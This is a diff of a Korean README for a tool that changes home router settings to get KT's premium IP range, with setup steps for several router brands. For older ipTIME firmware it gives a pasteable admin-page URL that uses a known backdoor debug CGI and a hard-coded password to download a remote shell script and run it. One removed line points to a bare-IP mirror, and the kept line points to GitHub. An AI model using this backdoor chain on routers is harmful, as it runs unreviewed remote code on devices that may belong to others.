@@ -7,7 +7,7 @@ Glacier/backblaze 백업, 스팀/Steam/에픽스토어/Epic Store 게임 다운�
 > 아래의 기기별 설정방법은 KT의 인터넷 회선 또는 KT GiGA WiFi로부터 IP를 할당받은 기기만 적용할 수 있으므로 여러 대의 Router를 임의로 설치한 환경 또는 이중 NAT 구성에서 어떤 기기가 주 Router인지 명확하게 인지하고 있지 않다면, 적용하기 전에 먼저 거주중인 지역에 홈 네트워크 컨설팅이 가능한 **<ins>출장 서비스</ins>[^1]를 받아야 합니다.**
 
 
-KT GiGA WiFi/iptime/ASUSWRT/OpenWrt/넷기어/시놀로지RT/Ubiquiti UniFi/기업용 브랜드 지원<br><a href="https://github.com/KRFOSS/bypassQoSKoreatelecomISP">TP-LINK Omada, OPNsense, MikroTik에 대한 설정방법은 ROKFOSS에서 제공됩니다.</a>
+KT GiGA WiFi/iptime/ASUSWRT/OpenWrt/넷기어/시놀로지RT/Ubiquiti UniFi/기업용 브랜드 지원<br><a href="https://github.com/KRFOSS/bypassQoSKoreatelecomISP">Omada Networks, OPNsense, MikroTik에 대한 설정방법은 ROKFOSS에서 제공됩니다.</a>
 
 <a href="https://github.com/veilRedeemer/bypassQoSKoreatelecomISP/issues/1">샤오미/레드미</a>
 
@@ -15,7 +15,7 @@ KT GiGA WiFi/iptime/ASUSWRT/OpenWrt/넷기어/시놀로지RT/Ubiquiti UniFi/기�
 
 예시 - KT GiGA WiFi/ASUSWRT의 컴퓨터/LAN 포트와 미지원 Router의 WAN/인터넷 포트를 연결한 경우. 단, **AP\/허브\/브릿지 모드 등으로 변경한 경우 Router로서 기능하지 않으므로 제외**
 
-​또한 적용 후 프리미엄 IP 대역은 원래 일반적인 컴퓨터/스마트 기기로부터의 트래픽이 거의 없었던 특성 상 몇몇 사이트에서 VPN 환경과 같이 Captcha 등을 요구하거나, 지연되거나, 액세스를 거부당할 가능성이 약간 높아집니다.
+​또한 적용 후 프리미엄 IP 대역은 원래 일반적인 컴퓨터/스마트 기기로부터의 트래픽이 거의 없었던 특성 상 몇몇 사이트에서 VPN 환경과 같이 Captcha 등을 요구하거나, 지연되거나, 액세스를 거부당하거나, 심지어 편집적인 성향의 일부 내수용 웹사이트에서는 계정 생성을 거부당하는 등의 예기치 못한 불이익을 받을 가능성이 약간 높아집니다.
 
 --------------------------------
 
@@ -111,10 +111,17 @@ KB01-411H - **각 기기**의 MAC 주소와 172.30.1.149부터 172.30.1.252까�
 ![StaticLeasePremiumIP_KTGiGAWiFi](https://github.com/user-attachments/assets/9d7bda7f-f1a5-4663-8435-f91347cf6cbf)
 
 __변경 사항은 다음에 유선 또는 무선으로 연결될 때 적용되므로 KT GiGA WiFi를 재시동하거나 각 기기의 네트워크 연결을 끊었다가 다시 연결해야 할 수 있습니다.__
-## iptime
-백도어 출처 - https://github.com/tylzars/iptime-debug - 펌웨어 버전 15.25.8, ipTIME A2004S에서 동작 확인됨<br>
+## iptime (버전 15.30.6 이상)
+
+인터넷 설정 정보의 '고급 설정'을 선택하고, Vendor Class에 스크린샷과 같이 입력 후 저장하세요.<br>
+아래 스크린샷과 같은 설정 페이지에 접근하는 방법을 스스로 알아내지 못했다면, **<ins>출장 서비스</ins>[^1]를 받으세요.**
+<img width="1030" height="630" alt="스크린샷 2026-02-04 오후 9 17 53" src="https://github.com/user-attachments/assets/6904ce11-7bc4-4c47-b406-16d1de6e05a2" />
+
+
+## iptime (버전 15.30.0 이하)
+백도어 출처 - https://github.com/tylzars/iptime-debug<br>
 > [!NOTE]
-> BE3600M/BE5100M 등 AN7563PT 탑재 기기를 지원하지 않는 문제가 확인되어 미러 링크에서 먼저 해당 문제를 수정하였으며, 곧 원본 링크에도 제공될 예정입니다.<br>
+> BE3600M/BE5100M 등 AN7563PT 탑재 기기와, 대부분의 EasyMesh-RT 모델은 더이상 지원하지 않습니다. 펌웨어 버전 15.30.6 이상으로 업그레이드하세요.<br>
 > 위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다
 
 <a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc 출처</a>
@@ -123,16 +130,7 @@ __변경 사항은 다음에 유선 또는 무선으로 연결될 때 적용되�
 <img width="285" alt="iptime1" src="https://github.com/user-attachments/assets/ef4882cc-03a4-4478-acd1-a0418048dca0" />
 
 2. 아래 주소 중 상황에 맞는 적절한 **하나**의 '⧉'를 선택하여 복사 후 로그인한 관리자 페이지의 주소 칸에 붙여넣어 마칩니다.<br>
-먼저 첫번째 주소는, 아래 스크린샷과 같이 'wget: not an http or ftp url' 메시지가 출력되며 원본 링크의 암호화된 연결을 지원하지 않는 환경에서 사용할 수 있는 미러 링크로서, 접속자의 IP 주소와 타임스탬프를 포함한 접속 기록을 저장함에 동의하고 사용하세요:
-```
-http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20http%3a%2f%2f168.138.196.144%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
-```
-<img width="498" alt="notls" src="https://github.com/user-attachments/assets/6ee27eda-0b7f-4213-a868-7a118907b1d3" />
-
-> [!NOTE]
-> Network Unreachable 오류가 출력되는 경우 원본 또는 미러 서버로부터 필요한 파일을 다운로드하지 못한 것이며, 미러 서버가 드물게 접속자의 IP 대역을 허용하지 않았을 수 있으므로 KT 인터넷을 사용중인 것이 맞다면 제보해주시기 바랍니다.
-
-또는 둘 중 사용자의 환경에서 사용 가능한 원본 링크 사용:
+둘 중 사용자의 환경에서 사용 가능한 원본 링크 사용:
 ```
 http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=curl%20-Lo%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
 ```
